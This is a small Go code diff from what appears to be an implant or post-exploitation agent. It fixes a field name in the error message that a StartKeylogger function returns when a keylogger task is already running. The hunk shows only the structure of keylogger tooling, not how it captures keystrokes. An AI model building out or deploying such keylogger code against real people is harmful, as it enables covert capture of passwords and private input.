@@ -135,7 +135,7 @@ func NewKeyLog() (KeyLog, error) {
 func StartKeylogger(task structs.Task, threadChannel chan<- structs.ThreadMsg) error {
 	// This function is responsible for dumping output.
 	if curTask != nil && curTask.Job.Monitoring {
-		return errors.New(fmt.Sprintf("Keylogger already running with task ID: %s", curTask.ID))
+		return errors.New(fmt.Sprintf("Keylogger already running with task ID: %s", curTask.TaskID))
 	}
 	curTask = &task
 	msgChan = threadChannel
